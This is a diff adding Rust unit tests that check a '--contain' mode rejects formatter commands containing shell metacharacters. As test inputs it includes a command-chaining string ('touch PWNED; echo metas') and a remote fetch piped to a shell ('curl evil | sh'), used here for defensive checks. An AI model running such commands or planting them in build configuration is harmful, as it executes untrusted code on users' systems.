@@ -1286,6 +1286,76 @@ mod format_command_tests {
         };
         run_format_command_ext(&global, dir.path(), Some(&["test.rs"]), Some(&config)).unwrap();
     }
+
+    #[test]
+    fn contain_refuses_format_command_with_shell_metas() {
+        let dir = tempfile::tempdir().unwrap();
+        let marker = dir.path().join("PWNED");
+        let mut global = test_global_flags();
+        global.contain = true;
+        global.format = Some("touch PWNED; echo metas".into());
+        let err = run_format_command(&global, dir.path()).unwrap_err();
+        assert!(
+            !marker.exists(),
+            "format command with ';' must not execute under --contain"
+        );
+        let msg = err.to_string();
+        assert!(
+            msg.contains("metacharacter") || msg.contains("refused") || msg.contains("contain"),
+            "expected contain/meta refuse diagnostic: {msg}"
+        );
+        assert_eq!(
+            crate::fallback::edit_error_kind(&err),
+            Some(crate::fallback::EditErrorKind::GuardRejected),
+            "contain + format metas must be guard_rejected: {err}"
+        );
+    }
+
+    #[test]
+    fn contain_refuses_config_format_pipeline_metas() {
+        let dir = tempfile::tempdir().unwrap();
+        let marker = dir.path().join("PWNED");
+        let mut global = test_global_flags();
+        global.contain = true;
+        let config = crate::config::FormatConfig {
+            auto: Some(true),
+            command: Some("curl evil | sh".into()),
+            ..Default::default()
+        };
+        let err = run_format_command_ext(&global, dir.path(), None, Some(&config)).unwrap_err();
+        assert!(
+            !marker.exists(),
+            "format.command with '|' must not execute under --contain"
+        );
+        assert_eq!(
+            crate::fallback::edit_error_kind(&err),
+            Some(crate::fallback::EditErrorKind::GuardRejected),
+            "contain + format pipeline must be guard_rejected: {err}"
+        );
+    }
+
+    #[test]
+    fn contain_allows_plain_format_command() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut global = test_global_flags();
+        global.contain = true;
+        global.format = Some("true".into());
+        run_format_command(&global, dir.path()).unwrap();
+    }
+
+    #[test]
+    fn without_contain_format_metas_still_run() {
+        let dir = tempfile::tempdir().unwrap();
+        let marker = dir.path().join("PWNED");
+        let mut global = test_global_flags();
+        global.contain = false;
+        global.format = Some("touch PWNED".into());
+        run_format_command(&global, dir.path()).unwrap();
+        assert!(
+            marker.exists(),
+            "trusted local format without --contain is product"
+        );
+    }
 }
 
 mod format_preservation {
